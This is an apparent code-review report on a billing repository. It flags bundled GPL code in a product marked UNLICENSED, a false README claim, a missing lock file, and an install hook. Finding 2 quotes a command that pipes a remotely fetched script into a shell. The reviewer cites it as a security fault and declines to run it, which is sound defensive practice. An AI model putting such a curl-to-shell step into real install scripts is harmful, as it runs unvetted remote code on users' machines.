# Engineering assessment — billing report

## Scope

**In scope:** every file — `src/report.js`, `vendor/quicksort-plus.js`,
`scripts/postinstall.sh`, `test/report.test.js`, `package.json`, `README.md`.

**Depth:** targeted. `vendor/` is explicitly in scope; a vendored directory is
where third-party code hides and the README makes a claim about it.

## What I ran

```
$ npm test
✔ rows are sorted by total ascending (0.8ms)
ℹ pass 1  ℹ fail 0
```

I did **not** run `npm install`, and would not have on an unfamiliar
repository — see finding 2. `npm audit` was therefore not run either; with no
declared dependencies and no lock file it would have had nothing to report.

## Findings

| # | Severity | Area | Finding | Evidence | Recommendation |
|---|---|---|---|---|---|
| 1 | Critical | Dependencies | GPL-3.0-or-later code is bundled into a product declared `UNLICENSED` and sold commercially | `vendor/quicksort-plus.js:1-9` carries a GPL v3-or-later header and is imported by `src/report.js:1`; `package.json:4` declares `"license": "UNLICENSED"` and `README.md` calls the product proprietary | Get legal advice before the next release. Replacing the file is a nine-line job — `Array.prototype.sort` with a comparator does it — but distribution may already have happened |
| 2 | Critical | Security | `postinstall` pipes a remote script straight into a shell | `package.json:10` runs `scripts/postinstall.sh`, and line 4 of that file is `curl -fsSL https://tables.example.com/latest/install.sh \| sh` | Remove it. Fetch tax tables as data at runtime with a pinned checksum, never as executable code at install time |
| 3 | High | Documentation | The README states no third-party code is bundled and that the vendored helper was written in-house; both are false | `README.md` against `vendor/quicksort-plus.js:1-9` | Correct the claim; it is the reason nobody has looked at the licence |
| 4 | Medium | Dependencies | No lock file and no declared dependencies, but an install-time network fetch | there is no `package-lock.json`; `package.json` declares no `dependencies` | If finding 2 is fixed this becomes moot; while it stands, installs are not reproducible |

**Findings 1, 2 and 3 are one failure.** `vendor/` was treated as in-house
code, so nobody read the header at the top of the file or asked what the
install step downloads. Both are visible in the first ten lines of the files
they are in.

## Unconfirmed / requires investigation

- **Whether the product has been distributed.** GPL obligations attach on
  distribution. If this only ever runs on the company's own servers the
  position is different, and nothing in this repository says which it is.
- **What `install.sh` actually does.** I did not fetch it — retrieving and
  reading a script this repository pipes into a shell is not something to do
  casually, and its contents can change between now and any install. The
  finding does not depend on what it contains today.

## Strengths

- **The one test asserts real behaviour.** `test/report.test.js` checks output
  ordering rather than that the function returns something truthy.
- **`src/report.js` is small and does one thing.** The GPL dependency is a
  single import at one call site, which is why finding 1 is cheap to remedy
  in code even if it is expensive in process.

## What I did not examine

- **The remote install script**, as above.
- **Any licence obligations beyond the file header.** I read the header; I am
  not qualified to say what compliance requires and finding 1 says to ask
  someone who is.
- **Runtime behaviour.** Nothing was executed except the unit test.
- **Whether the tax tables are used correctly**, since nothing in this
  repository reads them.
